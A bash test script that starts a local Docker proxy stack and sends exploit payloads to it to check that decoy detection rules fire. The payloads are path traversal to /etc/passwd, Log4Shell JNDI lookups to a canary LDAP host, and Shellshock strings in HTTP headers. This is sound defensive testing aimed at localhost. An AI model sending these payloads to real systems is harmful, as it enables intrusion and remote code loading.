#!/bin/bash
# ============================================================
# WARNING: This script sends recognizable CVE exploit payloads
# as real HTTP requests:
#   - Log4Shell (CVE-2021-44228): JNDI injection strings
#   - Shellshock (CVE-2014-6271): () { :; }; bash function syntax
#   - Path traversal: ../../../../etc/passwd
#
# Running this script WILL trigger SOC / IDS / SIEM alerts in
# monitored environments.  Coordinate with your security team
# and obtain explicit authorization before running it.
#
# These tests verify that the proxy's detection rules for the
# above CVEs are active and firing correctly.
# ============================================================

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

COMPOSE_FILE="docker-compose.neowriter.yaml"
export COMPOSE_FILE
PROXY="http://localhost:8000"

if [ ! -d "$SCRIPT_DIR/neowriter" ]; then
  echo "neowriter not found. Run ./setup-neowriter.sh first."
  exit 1
fi

echo "Starting neowriter stack..."
docker compose -f "$COMPOSE_FILE" down --remove-orphans 2>/dev/null || true
docker compose -f "$COMPOSE_FILE" up -d --build

echo "Waiting for proxy to be ready..."
for i in $(seq 1 30); do
  if curl -sf "$PROXY/" > /dev/null 2>&1; then
    echo "Proxy ready."
    break
  fi
  if [ "$i" -eq 30 ]; then
    echo "Proxy did not become ready in time. Check: docker compose -f $COMPOSE_FILE logs"
    docker compose -f "$COMPOSE_FILE" down
    exit 1
  fi
  sleep 2
done

echo "Waiting for WASM plugin to load initial decoy config..."
for i in $(seq 1 20); do
  if docker compose -f "$COMPOSE_FILE" logs proxy 2>&1 | grep -q "read new config"; then
    echo "Config loaded."
    break
  fi
  if [ "$i" -eq 20 ]; then
    echo "WASM plugin did not load config in time. Check: docker compose -f $COMPOSE_FILE logs proxy"
    docker compose -f "$COMPOSE_FILE" down
    exit 1
  fi
  sleep 2
done

echo ""
echo "=== Neowriter Sensitive (Exploit-Payload) Tests ==="

passed=0
failed=0

check_decoy_alert() {
  local name="$1"
  local decoy_key="$2"
  local proxy_logs
  proxy_logs=$(docker compose -f "$COMPOSE_FILE" logs proxy 2>&1)
  if [ "$(echo "$proxy_logs" | grep -cF "\"DecoyKey\":\"$decoy_key\"" || true)" -gt 0 ]; then
    echo -e "\033[0;32mPASS\033[0m $name"
    ((++passed))
  else
    echo -e "\033[0;31mFAIL\033[0m $name"
    ((++failed))
  fi
}

# 6-A: Path traversal reaches /etc/passwd after Envoy normalizes ../../
#       (Envoy strips ../ so we test the normalized destination path)
curl -s "$PROXY/../../etc/passwd" > /dev/null; sleep 2
check_decoy_alert "6-A Path traversal → /etc/passwd" "/etc/passwd"

# 6-B: Path traversal via file GET parameter (query strings are NOT normalized)
curl -s "$PROXY/?file=../../../../etc/passwd" > /dev/null; sleep 2
check_decoy_alert "6-B Path traversal via GET param" "file"

# L4J-1: Log4Shell injection via user-agent header (lowercase per HTTP/2)
curl -s -A '${jndi:ldap://canary.example.com/a}' "$PROXY/" > /dev/null; sleep 2
check_decoy_alert "L4J-1 Log4Shell via user-agent" "user-agent"

# L4J-2: Log4Shell injection via x-forwarded-for header
curl -s -H 'x-forwarded-for: ${jndi:ldap://canary.example.com/a}' "$PROXY/" > /dev/null; sleep 2
check_decoy_alert "L4J-2 Log4Shell via x-forwarded-for" "x-forwarded-for"

# SSH-1: Shellshock via user-agent header
curl -s -A '() { :; }; echo vulnerable' "$PROXY/" > /dev/null; sleep 2
check_decoy_alert "SSH-1 Shellshock via user-agent" "user-agent"

# SSH-2: Shellshock via referer header
curl -s -H 'referer: () { :; }; /bin/bash' "$PROXY/" > /dev/null; sleep 2
check_decoy_alert "SSH-2 Shellshock via referer" "referer"

echo ""
echo "=== Results: $passed passed, $failed failed ==="

echo "Stopping stack..."
docker compose -f "$COMPOSE_FILE" down

if [ "$failed" -gt 0 ]; then
  exit 1
fi
